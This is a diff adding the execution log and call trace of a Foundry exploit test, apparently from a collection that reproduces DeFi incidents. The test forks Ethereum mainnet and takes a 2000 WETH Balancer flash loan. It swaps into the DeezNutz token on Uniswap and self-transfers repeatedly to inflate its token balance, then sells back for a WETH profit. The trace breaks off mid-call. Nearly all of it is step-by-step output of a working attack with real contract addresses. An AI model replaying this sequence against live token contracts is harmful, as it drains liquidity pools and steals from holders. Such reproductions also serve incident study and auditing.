@@ -1,0 +1,262 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/DeezNutz404_exp.sol:DeezNutzTest
+[PASS] testExploit() (gas: 633716)
+Logs:
+  Before attack, WETH amount: 0
+  ------------------- flashloan from balancer ---------
+  after borrow, WETH amount: 2000
+  after swap, DeezNutz amount: 57541487
+  after self transfer, DeezNutz amount: 113886170
+  after self transfer, DeezNutz amount: 225874083
+  after self transfer, DeezNutz amount: 449849449
+  after self transfer, DeezNutz amount: 173325537
+  after self transfer, DeezNutz amount: 344520656
+  after swap back, WETH amount: 2048
+  ------------------- flashloan finish ----------------
+  after attack, WETH amount: 47
+
+Traces:
+  [13817] DeezNutzTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 19277802 [1.927e7])
+    │   └─ ← [Return] 0
+    ├─ [2534] WETH9::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "Before attack, WETH amount", val: 0)
+    └─ ← [Stop]
+
+  [664816] DeezNutzTest::testExploit()
+    ├─ emit log_string(val: "------------------- flashloan from balancer ---------")
+    ├─ [647660] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [2000000000000000000000 [2e21]], 0x)
+    │   ├─ [2534] WETH9::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   └─ ← [Return] 55069825222048879767850 [5.506e22]
+    │   ├─ [2350] ProtocolFeesCollector::getFlashLoanFeePercentage() [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [27962] WETH9::transfer(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2000000000000000000000 [2e21])
+    │   │   ├─ emit Transfer(from: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, to: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2000000000000000000000 [2e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000
+    │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x000000000000000000000000000000000000000000000ba957595b03bea0712a → 0x000000000000000000000000000000000000000000000b3cebc5ff780160712a
+    │   │   └─ ← [Return] true
+    │   ├─ [584504] DeezNutzTest::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [2000000000000000000000 [2e21]], [0], 0x)
+    │   │   ├─ [534] WETH9::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 2000000000000000000000 [2e21]
+    │   │   ├─ emit log_named_uint(key: "after borrow, WETH amount", val: 2000)
+    │   │   ├─ [24420] WETH9::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x466c74776b1cb1a6f02cc765a14cd3bfd6607c3d7fcc2476c94e5bc071e25f00: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WETH9::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 2000000000000000000000 [2e21]
+    │   │   ├─ [166064] UniswapV2Router02::swapExactTokensForTokens(2000000000000000000000 [2e21], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xb57E874082417b66877429481473CF9FCd8e0b8a], DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [2504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 60633751849484929170081096 [6.063e25], 59087960396039603932 [5.908e19], 1708539959 [1.708e9]
+    │   │   │   ├─ [8225] WETH9::transferFrom(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2], 2000000000000000000000 [2e21])
+    │   │   │   │   ├─ emit Transfer(from: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2], value: 2000000000000000000000 [2e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000 → 0
+    │   │   │   │   │   @ 0x4339748af3a2edb11e70a4d75d4fb763308b51ca1371cb84fb209df22ad2147d: 0x00000000000000000000000000000000000000000000000334029aeb344a46dc → 0x00000000000000000000000000000000000000000000006f9f95f676f18a46dc
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [145016] UniswapV2Pair::swap(58888709845899971787718735 [5.888e25], 0, DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [120164] DeezNutz::transfer(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 58888709845899971787718735 [5.888e25])
+    │   │   │   │   │   ├─ [4911] DeezNutz::balanceOf(UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 60633751849484929170081096 [6.063e25]
+    │   │   │   │   │   ├─ [26925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2], to: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 58888709845899971787718735 [5.888e25])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530b: 0x00000000000000000000000000000000000000000005f3afc07ca26533cd062a → 0x000000000000000000000000000000000000000000072b70d5f98ba0b5129c92
+    │   │   │   │   │   │   @ 0x07da1d7d0e068a758db211ad315455b478bab552cd5604241eeddd0963bcfade: 0x1690489d7f15081a323b15b956449a17fa3054fe09452604bd98cd36acd3c90f → 0x0135b71dc6780b54d65c98eea4483849cc53b1d7ed3976ad9418286954b5f372
+    │   │   │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb601: 0 → 0x14d1e77620cc43406cc5b9d61c8ea2c5e92a0ffd7968cbe3c13e83a89aa471e5
+    │   │   │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb5ff: 0 → 0x002f7e6a46078810b199e9e70000000000000000030000000000000000000000
+    │   │   │   │   │   │   @ 0x07da1d7d0e068a758db211ad315455b478bab552cd5604241eeddd0963bcfadc: 0x003227b24628a908193705480000000000000000030000000000000000000000 → 0x00017186eaa437bbe65784f90000000000000000030000000000000000000000
+    │   │   │   │   │   │   @ 0x07da1d7d0e068a758db211ad315455b478bab552cd5604241eeddd0963bcfadd: 0x0000000000000000000000000000000000000000003227b24628a90819370548 → 0x000000000000000000000000000000000000000000017186eaa437bbe65784f9
+    │   │   │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530a: 0xfd5d3503effa2033dadb1f694c4716de9f4f32e4029d0140f975bf63ae4e1f8c → 0xfcd48afa582966aeebc25c74b6d957d65a9c9fbb5ffa1dcd91339e3ef0d4bbd4
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [911] DeezNutz::balanceOf(UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1745042003584957382362361 [1.745e24]
+    │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2059087960396039603932 [2.059e21]
+    │   │   │   │   ├─ emit Sync(reserve0: 1745042003584957382362361 [1.745e24], reserve1: 2059087960396039603932 [2.059e21])
+    │   │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 2000000000000000000000 [2e21], amount0Out: 58888709845899971787718735 [5.888e25], amount1Out: 0, to: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x65d6403700000000000334029aeb344a46dc0000003227b24628a90819370548 → 0x65d6403700000000006f9f95f676f18a46dc000000017186eaa437bbe65784f9
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return] [2000000000000000000000 [2e21], 58888709845899971787718735 [5.888e25]]
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 57541487735396394030748246 [5.754e25]
+    │   │   ├─ emit log_named_uint(key: "after swap, DeezNutz amount", val: 57541487 [5.754e7])
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 57541487735396394030748246 [5.754e25]
+    │   │   ├─ [29996] DeezNutz::transfer(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 57541487735396394030748246 [5.754e25])
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 57541487735396394030748246 [5.754e25]
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 57541487735396394030748246 [5.754e25]
+    │   │   │   ├─ emit Transfer(from: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 57541487735396394030748246 [5.754e25])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530a: 0xfcd48afa582966aeebc25c74b6d957d65a9c9fbb5ffa1dcd91339e3ef0d4bbd4 → 0xfc4f4b9764244b66e90a37e1dd0915d08694d0c278dc50dff7296e6e43ae8788
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb5ff: 0x002f7e6a46078810b199e9e70000000000000000030000000000000000000000 → 0x005e012557f3bf07573d2f6a0000000000000000030000000000000000000000
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530b: 0x000000000000000000000000000000000000000000072b70d5f98ba0b5129c92 → 0x000000000000000000000000000000000000000000085c1017e5f280652a11d4
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb601: 0x14d1e77620cc43406cc5b9d61c8ea2c5e92a0ffd7968cbe3c13e83a89aa471e5 → 0x291e8f894d936b38d6d34ed52b9322144a354d3bd50e1aedf96f23708a9e5fdd
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 113886170084030166081435726 [1.138e26]
+    │   │   ├─ emit log_named_uint(key: "after self transfer, DeezNutz amount", val: 113886170 [1.138e8])
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 113886170084030166081435726 [1.138e26]
+    │   │   ├─ [29996] DeezNutz::transfer(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 113886170084030166081435726 [1.138e26])
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 113886170084030166081435726 [1.138e26]
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 113886170084030166081435726 [1.138e26]
+    │   │   │   ├─ emit Transfer(from: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 113886170084030166081435726 [1.138e26])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb601: 0x291e8f894d936b38d6d34ed52b9322144a354d3bd50e1aedf96f23708a9e5fdd → 0x5135f51592cff3c375148862a6e1a6a9d0dbb0b841abdb0a7281217f8cdabb5a
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530b: 0x000000000000000000000000000000000000000000085c1017e5f280652a11d4 → 0x0000000000000000000000000000000000000000000ab6f8a2770a66c7892809
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530a: 0xfc4f4b9764244b66e90a37e1dd0915d08694d0c278dc50dff7296e6e43ae8788 → 0xfb48219a5bcd68b8b07822c80ac6caed6b54bcccb3f467fda5c5a8dddc55eb7f
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb5ff: 0x005e012557f3bf07573d2f6a0000000000000000030000000000000000000000 → 0x00ba0dc2c2c660185b57da670000000000000000030000000000000000000000
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 225874083004001365331634942 [2.258e26]
+    │   │   ├─ emit log_named_uint(key: "after self transfer, DeezNutz amount", val: 225874083 [2.258e8])
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 225874083004001365331634942 [2.258e26]
+    │   │   ├─ [29996] DeezNutz::transfer(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 225874083004001365331634942 [2.258e26])
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 225874083004001365331634942 [2.258e26]
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 225874083004001365331634942 [2.258e26]
+    │   │   │   ├─ emit Transfer(from: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 225874083004001365331634942 [2.258e26])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb601: 0x5135f51592cff3c375148862a6e1a6a9d0dbb0b841abdb0a7281217f8cdabb5a → 0xa0642a7101f44e3ba0d55a2e4afb6a9ca79f5ac89b91b64c5992bdd34ac51f73
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530b: 0x0000000000000000000000000000000000000000000ab6f8a2770a66c7892809 → 0x0000000000000000000000000000000000000000000f62bd19586959163b9782
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb5ff: 0x00ba0dc2c2c660185b57da670000000000000000030000000000000000000000 → 0x017101a0af8c4cc6491066830000000000000000030000000000000000000000
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530a: 0xfb48219a5bcd68b8b07822c80ac6caed6b54bcccb3f467fda5c5a8dddc55eb7f → 0xf94061e03821cf6d67246c6a9d7937452af603f845dbfd6cbc426d41689469a2
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 449849449747883661017074273 [4.498e26]
+    │   │   ├─ emit log_named_uint(key: "after self transfer, DeezNutz amount", val: 449849449 [4.498e8])
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 449849449747883661017074273 [4.498e26]
+    │   │   ├─ [29996] DeezNutz::transfer(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 449849449747883661017074273 [4.498e26])
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 449849449747883661017074273 [4.498e26]
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 449849449747883661017074273 [4.498e26]
+    │   │   │   ├─ emit Transfer(from: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 449849449747883661017074273 [4.498e26])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb5ff: 0x017101a0af8c4cc6491066830000000000000000030000000000000000000000 → 0x008cfe0fcf6e26544f5653800000000000000000030000000000000000000000
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530a: 0xf94061e03821cf6d67246c6a9d7937452af603f845dbfd6cbc426d41689469a2 → 0xf53de0d098154d78b6524a84c4671c34b02e0c69359139e1d71e3ea941e2f3f2
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530b: 0x0000000000000000000000000000000000000000000f62bd19586959163b9782 → 0x00000000000000000000000000000000000000000018b038c9926a87ec56d62a
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb601: 0xa0642a7101f44e3ba0d55a2e4afb6a9ca79f5ac89b91b64c5992bdd34ac51f73 → 0x3cc5d3d263dc1a8290d8926bc05f25d9f2e479ec8916d1819b642b8888303de1
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 173325537079438236737021878 [1.733e26]
+    │   │   ├─ emit log_named_uint(key: "after self transfer, DeezNutz amount", val: 173325537 [1.733e8])
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 173325537079438236737021878 [1.733e26]
+    │   │   ├─ [29996] DeezNutz::transfer(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 173325537079438236737021878 [1.733e26])
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 173325537079438236737021878 [1.733e26]
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 173325537079438236737021878 [1.733e26]
+    │   │   │   ├─ emit Transfer(from: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 173325537079438236737021878 [1.733e26])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530a: 0xf53de0d098154d78b6524a84c4671c34b02e0c69359139e1d71e3ea941e2f3f2 → 0xf3b8eeb8226300023f8014109d74a211cc8228b4f7b48a9c9cd207140a89c83a
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb601: 0x3cc5d3d263dc1a8290d8926bc05f25d9f2e479ec8916d1819b642b8888303de1 → 0x7806b58c5205e78eaadeee39382c8a62cadb2327e26ac956a880b8044dfd5871
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530b: 0x00000000000000000000000000000000000000000018b038c9926a87ec56d62a → 0x0000000000000000000000000000000000000000001c45ccb1341af034f803f4
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb5ff: 0x008cfe0fcf6e26544f5653800000000000000000030000000000000000000000 → 0x011b28a47ae5702e69bd21a20000000000000000030000000000000000000000
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 344520656997654182623041026 [3.445e26]
+    │   │   ├─ emit log_named_uint(key: "after self transfer, DeezNutz amount", val: 344520656 [3.445e8])
+    │   │   ├─ [24396] DeezNutz::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x25eafba5f82bfe9a73d12695ef81d3767ae901ff167753ef8c15cce21e242a07: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 344520656997654182623041026 [3.445e26]
+    │   │   ├─ [21928] DeezNutz::transfer(UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2], 17226032849882709131152051 [1.722e25])
+    │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 344520656997654182623041026 [3.445e26]
+    │   │   │   ├─ [911] DeezNutz::balanceOf(UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1745042003584957382362361 [1.745e24]
+    │   │   │   ├─ emit Transfer(from: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2], value: 17226032849882709131152051 [1.722e25])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb5ff: 0x011b28a47ae5702e69bd21a20000000000000000030000000000000000000000 → 0x010ebb55208fa80d9feb8b4f0000000000000000030000000000000000000000
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530a: 0xf3b8eeb8226300023f8014109d74a211cc8228b4f7b48a9c9cd207140a89c83a → 0xf392862c1e71b670783f2901b153755fdde00a36fca14e2250970a386fa81a36
+    │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530b: 0x0000000000000000000000000000000000000000001c45ccb1341af034f803f4 → 0x0000000000000000000000000000000000000000001ca0fe51eb894e8a667905
+    │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb601: 0x7806b58c5205e78eaadeee39382c8a62cadb2327e26ac956a880b8044dfd5871 → 0x72065fabb45268c788ba2f424d186730a09a6a3d40545584c512b85f03ae8065
+    │   │   │   │   @ 0x07da1d7d0e068a758db211ad315455b478bab552cd5604241eeddd0963bcfadc: 0x00017186eaa437bbe65784f90000000000000000030000000000000000000000 → 0x000f56166696081aea2b5a9b0000000000000000030000000000000000000000
+    │   │   │   │   @ 0x07da1d7d0e068a758db211ad315455b478bab552cd5604241eeddd0963bcfade: 0x0135b71dc6780b54d65c98eea4483849cc53b1d7ed3976ad9418286954b5f372 → 0x070fa472603a408a31406cd6a33b2eca07f24c44943cae052b4b2b3304231d7a
+    │   │   │   │   @ 0x07da1d7d0e068a758db211ad315455b478bab552cd5604241eeddd0963bcfadd: 0x000000000000000000000000000000000000000000017186eaa437bbe65784f9 → 0x0000000000000000000000000000000000000000000f56166696081aea2b5a9b
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 327508020555910453632776290 [3.275e26]
+    │   │   ├─ [66983] UniswapV2Router02::swapExactTokensForTokens(327508020555910453632776290 [3.275e26], 0, [0xb57E874082417b66877429481473CF9FCd8e0b8a, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 1745042003584957382362361 [1.745e24], 2059087960396039603932 [2.059e21], 1708539959 [1.708e9]
+    │   │   │   ├─ [22016] DeezNutz::transferFrom(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2], 327508020555910453632776290 [3.275e26])
+    │   │   │   │   ├─ [4925] DeezNutz::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 327508020555910453632776290 [3.275e26]
+    │   │   │   │   ├─ [911] DeezNutz::balanceOf(UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 18540424032220598785235611 [1.854e25]
+    │   │   │   │   ├─ emit Transfer(from: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2], value: 327508020555910453632776290 [3.275e26])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x07da1d7d0e068a758db211ad315455b478bab552cd5604241eeddd0963bcfadc: 0x000f56166696081aea2b5a9b0000000000000000030000000000000000000000 → 0x011778cba2da3e703e4a0b2e0000000000000000030000000000000000000000
+    │   │   │   │   │   @ 0x07da1d7d0e068a758db211ad315455b478bab552cd5604241eeddd0963bcfadd: 0x0000000000000000000000000000000000000000000f56166696081aea2b5a9b → 0x0000000000000000000000000000000000000000011778cba2da3e703e4a0b2e
+    │   │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530a: 0xf392862c1e71b670783f2901b153755fdde00a36fca14e2250970a386fa81a36 → 0xf0b8c3c7d389409eae6db4bc1d3530b7b124eed95e0f3e144b601cf8c4686594
+    │   │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb601: 0x72065fabb45268c788ba2f424d186730a09a6a3d40545584c512b85f03ae8065 → 0x00000000000000000000002da84f2a0374909e127989a90585854fa9862479a9
+    │   │   │   │   │   @ 0x0000000000000000000000000000000000000000000000a20d6e21d0e525530b: 0x0000000000000000000000000000000000000000001ca0fe51eb894e8a667905 → 0x0000000000000000000000000000000000000000002366ce74492ecd724d00d4
